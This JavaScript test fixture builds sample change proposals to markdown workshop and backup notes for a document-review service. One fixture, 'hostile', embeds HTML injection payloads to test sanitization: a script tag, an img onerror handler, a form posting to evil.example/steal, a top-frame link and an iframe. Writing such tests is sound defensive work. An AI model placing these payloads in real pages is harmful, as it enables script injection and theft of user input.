import { readFile } from 'node:fs/promises';
import { createChangeSetProposal, applyChangeSetProposal, changeSetProposalDigest, describeChangeSet } from '@cyberbaser/proposal';
import { createOwnerAlphaHandler, OwnerAlphaError, validateOwnerAlphaConfig } from '../src/index.js';

const repository = 'https://forge.example/owner/workshop.git';
const receivedAt = new Date().toISOString().replace(/\.\d{3}Z$/u, 'Z');
const expiresAt = '2030-02-02T00:00:00Z';
const digest = `sha-256=:${Buffer.alloc(32, 7).toString('base64')}:`;
const folder = '# Workspace note\n\nStore the notes in the blue folder.\n\n## After each meeting\n\nKeep last week’s notes next to the current agenda. Move finished notes to the archive at the end of the month.\n\n- Write dates in the same format.\n- Leave a link to any decision that affects the next meeting.\n\n> The next person should be able to find the decision without asking.\n';
const section = (heading) => `## ${heading}\n\nSet aside a clear working area before anyone arrives. The whiteboard belongs to the whole team; photograph the final board before erasing it. Put the markers back when you are done.\n\nFirst-time visitors can ask the host for a short introduction. The printed schedule by the door lists each room and its closing time.\n\n`;
const long = `# Workshop handbook\n\nFind the short instructions below before opening the shared room.\n\n${section('Getting started')}Store the notes in the blue folder.\n\n${['Before you arrive', 'Opening the west entrance', 'Borrowing equipment', 'Organizing the benches'].map(section).join('')}Keep a paper sign-in sheet.\n\n${['Welcoming new members', 'Working with guests', 'Troubleshooting'].map(section).join('')}Close the room at seven.\n\n${section('Keys and cleanup')}`;
const properties = '---\ntitle: Workshop notebook\nowner: workshop\n---\n\n# Workshop notebook\n\nNotes and records from the shared workshop.\n';
const backup = (destination = 'original drive') => `# Testing a backup\n\nA successful backup job tells you the copy finished. A restore test tells you whether you can use it.\n\n## Choose a destination\n\nRestore a small folder to the ${destination}. Leave the working copy alone.\n\nPick a folder you know well. For the command, see the [restore guide](https://docs.example/restore).\n\n## Check the contents\n\nOpen a document and a photo from the restored folder. Compare their checksums with the originals.\n\n## Record the result\n\nKeep one entry per test, with the snapshot name and how long it took.\n`;
const rewrites = [
  ['Restore some files somewhere and see if it worked. If nothing complains, the backup is probably fine for now.',
    'Restore a small folder to a spare drive. Keep the working copy disconnected until you have checked every restored file.'],
  ['Look at a few files when you have time. If they open at all, you can assume the rest of them are fine.',
    'Open a document and a photo from the restored folder. Compare their checksums with the originals; a matching count is not enough.'],
  ['Delete the test copy when you are done so it does not take up space on the drive afterwards.',
    'Keep the restored folder until you have written down the snapshot name, the date and how long the restore took.'],
];
const rewriteBase = `# Testing a backup\n\nA successful backup job tells you the copy finished. A restore test tells you whether you can use it.\n\n## Run a restore test\n\n${rewrites.map(([old]) => old).join('\n\n')}\n\n## Record the result\n\nKeep one entry per test.\n`;
const pairs = [['source', 'destination'], ['big', 'small'], ['quick', 'full'], ['old', 'oldest'], ['file', 'folder'], ['copy', 'snapshot'], ['check', 'verify'], ['size', 'checksum'], ['sample', 'photo'], ['first', 'last'], ['date', 'size'], ['length', 'duration'], ['day', 'time'], ['broken', 'missing'], ['note', 'entry'], ['user', 'person'], ['disk', 'drive'], ['later', 'afterwards'], ['tool', 'command'], ['list', 'log'], ['week', 'month'], ['save', 'keep'], ['plan', 'schedule'], ['done', 'finished']];
const frames = ['Pick the {} before you start.', 'Restore a {} folder first.', 'Run a {} restore once a quarter.', 'Start with the {} snapshot.', 'Open one {} you know well.', 'Name the {} you restored from.', 'Always {} the result yourself.', 'Compare the {} for each file.', 'Open a restored {} at full size.', 'Read the {} page of a document.', 'Check the {} of the archive.', 'Record the {} of the restore.', 'Include the start {} in the record.', 'List any {} files before cleaning up.', 'Keep one {} per test.', 'Say which {} ran the test.', 'Leave the working {} alone.', 'Delete the restored copy {}.', 'Write down the {} you used.', 'Keep the {} with the backups.', 'Repeat the test every {}.', '{} the record for a year.', 'Put the next test on the {}.', 'Mark the test {}.'];
const manyBase = `# Testing a backup\n\n## Before you start\n\n${frames.map((frame, index) => `${index === 8 ? '## Check the contents\n\n' : index === 16 ? '## Afterwards\n\n' : ''}${frame.replace('{}', pairs[index][0])}`).join('\n\n')}\n`;
const manyEdits = frames.map((frame, index) => [`${pairs[index][0]}${frame.split('{}')[1]}`, pairs[index][0], pairs[index][1]]);
const propertiesBackup = `---\ntitle: Testing a backup\ntags: storage\n---\n\n# Testing a backup\n\nRestore a small folder to the original drive. Leave the working copy alone.\n\nPick a folder you know well. Use it again next time so the results are comparable.\n`;
const hostile = '# Restore notes\n\nRestore a small folder to the original drive.\n\n<script>window.HOSTILE_SCRIPT = 1</script>\n\n<img src="x" onerror="window.HOSTILE_IMG = 1">\n\n<form action="https://evil.example/steal"><input name="q"></form>\n\n<a href="https://evil.example/away" target="_top">Read more</a>\n\n<iframe src="https://evil.example/frame"></iframe>\n\nThe ending stays.\n';
const longReason = 'Several of the restore steps used different words for the same thing, which made the checklist harder to follow during an actual restore. This replaces them with one consistent set of terms. Nothing about the order of the steps changes. Each replacement is one word, so the page reads the same apart from the wording.';
const listCode = '# Workshop checklist\n\nReview these steps before a session.\n\n- Put a label on the blue folder.\n- Check that all stations are clean.\n\n## Configuration\n\n```ini\nlocation = west\nmode = standard\n```\n\n> Ask the host before changing shared settings.\n\n| Item | Place |\n| --- | --- |\n| Pens | Desk |\n';

export const FIXTURE_TEXTS = Object.freeze({ backup: backup(), rewriteBase, revision: 'a'.repeat(40) });

export function createProposalDocumentFixture({ port = 47611, hostileLabel = false, extraHiddenCases = false, appearance = null, reviewSiteRoot = null } = {}) {
  const recorded = [];
  const cases = new Map();
  const add = (key, baseText, edits, lane = 'lane-b', options = {}) => {
    const index = cases.size + 1;
    const queueId = `Q-00000000-0000-4000-8000-${String(index).padStart(12, '0')}`;
    const base = Buffer.from(baseText);
    const source = { repository, revision: 'a'.repeat(40), path: options.path ?? 'workspace-note.md' };
    const proposal = createChangeSetProposal(base, {
      proposalId: `proposal-review:${key}`, source,
      submission: { submittedAt: receivedAt, rationale: options.reason ?? 'This makes the instructions match how the workshop runs today.', evidence: [], identityClaim: null },
      operations: edits.map(([find, expected, replacement], number) => {
        const start = base.indexOf(find);
        if (start < 0) throw new Error(`fixture splice missing: ${key}`);
        return { operationId: `change-${number + 1}`, start, end: start + Buffer.byteLength(expected), expected, replacement };
      }),
    });
    const submitter = { label: hostileLabel ? '<em>Draft Agent</em>' : 'Workspace Draft Agent', kind: 'agent', id: 'workspace-draft', keyId: 'key-workspace-0123456789' };
    const carrier = lane === 'lane-a' ? { lane, metadata: { pullRequestNumber: 42, repositoryId: 7, headSha: 'b'.repeat(40) } }
      : lane === 'lane-signed' ? { lane, metadata: { submitter } } : { lane };
    const tier = lane === 'lane-b' ? 'anonymous' : 'identified';
    const route = 'full-review';
    const summary = { schemaVersion: 1, artifactType: 'cyberbaser-proposal-review-summary', queueId, source, proposalId: proposal.proposalId,
      proposalDigest: changeSetProposalDigest(proposal), reviewEvidenceDigest: digest, candidateDigest: proposal.changeSet.files[0].candidate.digest,
      state: 'pending-review', lane, tier, route, receivedAt, expiresAt };
    const evidence = { queueId, proposal, carrier, state: { state: 'pending-review' }, classification: {
      verifiedSubject: lane === 'lane-a' ? { author: 'https://forge.example#user=47' } : null,
      policyStatus: 'valid', policyDigest: digest, classification: { tier, route, reasons: [], checks: {} },
    } };
    const entry = { summary, evidence, document: { baseText, candidateText: applyChangeSetProposal(base, proposal).toString(), reason: null },
      changes: describeChangeSet(base, proposal), sourceVerification: { gitObjectId: 'd'.repeat(40) } };
    const decision = !options.decision ? null : { queueId, action: options.decision, reason: 'The workshop owner reviewed the note and recorded a decision.', decidedAt: receivedAt,
      decisionAuthority: { identity: 'owner', type: 'owner-alpha-local' }, authorityScope: 'decision-only', reviewEvidenceDigest: digest, reviewEvidence: evidence };
    cases.set(key, { queueId, entry, decision, options });
  };
  add('folder-agent', folder, [['blue fol', 'blue fol', 'green bin']], 'lane-signed', { reason: 'We moved the meeting notes into the binder beside the entrance.' });
  add('long-three-visitor', long, [['blue fol', 'blue fol', 'green bin'], ['paper', 'paper', 'digital'], ['seven', 'seven', 'eight']], 'lane-b', { path: 'workshop-handbook.md' });
  add('insertion-visitor', '# Opening the room\n\nBring the binder.\n\nOpen the west entrance and check the sign-in sheet on the desk.\n', [['binder', '', 'green ']], 'lane-b');
  add('deletion-visitor', '# Opening the room\n\nBring the green binder.\n\nOpen the west entrance and check the sign-in sheet on the desk.\n', [['green ', 'green ', '']], 'lane-b');
  add('list-code-pull-request', listCode, [['blue fol', 'blue fol', 'green bin'], ['standard', 'standard', 'quiet']], 'lane-a', { path: 'workshop-checklist.md' });
  add('already-approved', folder, [['blue fol', 'blue fol', 'green bin']], 'lane-signed', { decision: 'approve', application: 'eligible' });
  add('already-rejected', folder, [['blue fol', 'blue fol', 'green bin']], 'lane-b', { decision: 'reject' });
  add('properties-pending', properties, [['workshop\n', 'workshop', 'office']], 'lane-signed', { path: 'workshop-notebook.md' });
  add('properties-unapplicable', properties, [['workshop\n', 'workshop', 'office']], 'lane-signed', { path: 'workshop-notebook.md', decision: 'approve', application: 'unapplicable', applicationReason: 'frontmatter-change' });
  add('approved-stale', folder, [['blue fol', 'blue fol', 'green bin']], 'lane-b', { decision: 'approve', application: 'stale', applicationReason: 'source-changed' });
  add('expired', folder, [['blue fol', 'blue fol', 'green bin']], 'lane-b', { error: 'review-expired' });
  add('base-unreachable', folder, [['blue fol', 'blue fol', 'green bin']], 'lane-b', { error: 'review-revision-unreachable' });
  add('markup-and-hidden', '# Safe visible title\n\nA visible line about a folder.\n\n<!--\n\nHTML_BASE_CANARY.\n\n-->\n\nThe ending stays.\n',
    [['folder', 'folder', '<em>binder</em>'], ['HTML_BASE_CANARY', 'HTML_BASE_CANARY', 'HTML_CANDIDATE_CANARY']], 'lane-signed', { reason: 'Plain rationale.' });
  add('marked-hidden-delimiters', '# Safe visible title\n\n<!--\n\nHTML_DELIMITER_CANARY.\n\n-->\n\nThe ending stays.\n',
    [['<!--\n\n', '<!--\n\n', ''], ['-->\n\n', '-->\n\n', '']], 'lane-b', { reason: 'Plain rationale.' });
  const backupPath = 'curations/backups/testing-a-backup.md';
  add('one-word', backup(), [['original drive', 'original drive', 'spare drive']], 'lane-signed', { path: backupPath, reason: 'Keep the restore off the working drive.' });
  add('rewrite-three', rewriteBase, rewrites.map(([old, next]) => [old, old, next]), 'lane-signed', { path: backupPath, reason: 'Spell out how to verify the restored files.' });
  add('many-24', manyBase, manyEdits, 'lane-signed', { path: backupPath, reason: longReason });
  add('link-destination', backup('spare drive'), [['docs.example/restore', 'docs.example', 'help.example']], 'lane-signed', { path: backupPath, reason: 'The guide moved to the help site.' });
  add('properties-title', propertiesBackup, [['Testing a backup\ntags', 'Testing a backup', 'Test a backup'], ['storage\n', 'storage', 'storage, recovery'], ['original drive', 'original', 'spare']], 'lane-a', { path: backupPath });
  add('hostile-html', hostile, [['original drive', 'original', 'spare']], 'lane-b', { path: 'restore-notes.md' });
  add('applied', backup(), [['original drive', 'original drive', 'spare drive']], 'lane-signed', { path: backupPath, reason: 'Keep the restore off the working drive.', decision: 'approve', application: 'applied' });
  add('approved-backup', backup(), [['original drive', 'original drive', 'spare drive']], 'lane-signed', { path: backupPath, reason: 'Keep the restore off the working drive.', decision: 'approve', application: 'eligible' });
  add('rejected-backup', backup(), [['original drive', 'original drive', 'spare drive']], 'lane-b', { path: backupPath, decision: 'reject' });
  if (extraHiddenCases) {
    add('obsidian-hidden', '# Safe visible title\n\nLook in the folder.\n\n%% OBSIDIAN_CONTEXT_CANARY %%\n\nThe ending stays.\n', [['folder', 'folder', 'binder']]);
    add('added-hidden-delimiters', '# Safe visible title\n\nHTML_NEW_COMMENT_CANARY.\n\nThe ending stays.\n',
      [['HTML_NEW_COMMENT_CANARY', '', '<!--\n\n'], ['The ending', '', '-->\n\n']]);
    add('replay-unavailable', '# Workshop note\n\n%% OBSIDIAN_UNAVAILABLE_CANARY %%\n', [['OBSIDIAN_UNAVAILABLE_CANARY', 'OBSIDIAN_UNAVAILABLE_CANARY', 'amended']]);
    cases.get('replay-unavailable').entry.document.candidateText += 'Unknown trailing text.';
  }
  const values = [...cases.values()];
  const find = (id) => values.find(({ queueId }) => id === queueId);
  const receipt = ({ decision, entry }) => ({ decision, summary: entry.summary, queueRetained: true });
  const review = {
    applicationAvailable: true,
    async list() { return { actionable: values.filter((item) => !item.decision && !item.options.error).map((item) => item.entry), history: values.filter((item) => item.decision).map(receipt), historyTruncated: false, nextCursor: null }; },
    async load(id) {
      const item = find(id);
      if (item.options.error) throw new OwnerAlphaError(item.options.error, item.options.error);
      return { entry: item.entry, decision: item.decision };
    },
    async loadDecision(id) { return receipt(find(id)); },
    // Records what reached the decision service, then refuses: the fixture
    // never stores a decision.
    async record(intent) { recorded.push(intent); throw new OwnerAlphaError('lock-busy', 'fixture does not record decisions'); },
    async applicationStatus(id) {
      const { options } = find(id);
      if (options.application === 'applied') {
        const latest = { attempt: 1, appliedAt: receivedAt, jobId: 'OA-fixture-applied', jobState: 'pushing', failure: null, retryable: false };
        return { state: 'applied', reason: null, attempts: [latest], latest };
      }
      return { state: options.application, reason: options.applicationReason, attempts: [] };
    },
  };
  const ownerOrigin = `http://127.0.0.1:${port}`;
  const readerOrigin = `http://127.0.0.1:${port + 1}`;
  return {
    cases, ownerOrigin, readerOrigin, recorded,
    async handler() {
      const raw = JSON.parse(await readFile(new URL('../owner-alpha.example.json', import.meta.url), 'utf8'));
      Object.assign(raw.listen, { port, readerPort: port + 1 });
      Object.assign(raw.proposalReview, { enabled: true, socketPath: '/run/user/1000/cyberbaser/review.sock' });
      return createOwnerAlphaHandler({ config: validateOwnerAlphaConfig(raw), proposalReview: review, reviewAppearance: appearance, reviewSiteRoot,
        createEditSession: async () => { throw new Error('not available'); }, saveEdit: async () => { throw new Error('not available'); },
        lookupJob: async () => null });
    },
  };
}
